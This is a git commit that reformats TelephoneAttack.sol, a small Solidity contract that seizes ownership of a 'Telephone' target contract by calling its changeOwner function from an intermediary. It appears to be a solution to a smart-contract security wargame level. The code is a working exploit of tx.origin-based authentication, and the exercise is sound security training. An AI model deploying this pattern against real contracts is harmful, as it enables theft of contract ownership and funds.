efe587a0d26d8e4e9aa2d9f7619aeadf326fe73e
sogasg <sogasg@gmail.com>
2021-06-21 00:12:15 +0200

    Fix log comment

--- contracts/TelephoneAttack.sol
+++ contracts/TelephoneAttack.sol
@@ -1,23 +1,24 @@
-
 //SPDX-License-Identifier: Unlicense
 pragma solidity ^0.7.0;
 
 import "hardhat/console.sol";
 
-interface Telephone{
+interface Telephone {
     function changeOwner(address) external;
 }
 
 contract TelephoneAttack {
-  address telephoneContractAddress;
+    address telephoneContractAddress;
 
-  constructor(address _telephoneContractAddress) {
-    console.log("Deploying a Greeter with greeting:", _telephoneContractAddress);
-    telephoneContractAddress = _telephoneContractAddress;
-  }
+    constructor(address _telephoneContractAddress) {
+        console.log(
+            "Deploying a Telephon attack with telephone contract address:",
+            _telephoneContractAddress
+        );
+        telephoneContractAddress = _telephoneContractAddress;
+    }
 
-  function attack() public {
-      Telephone(telephoneContractAddress).changeOwner(msg.sender);
-  }
-
+    function attack() public {
+        Telephone(telephoneContractAddress).changeOwner(msg.sender);
+    }
 }
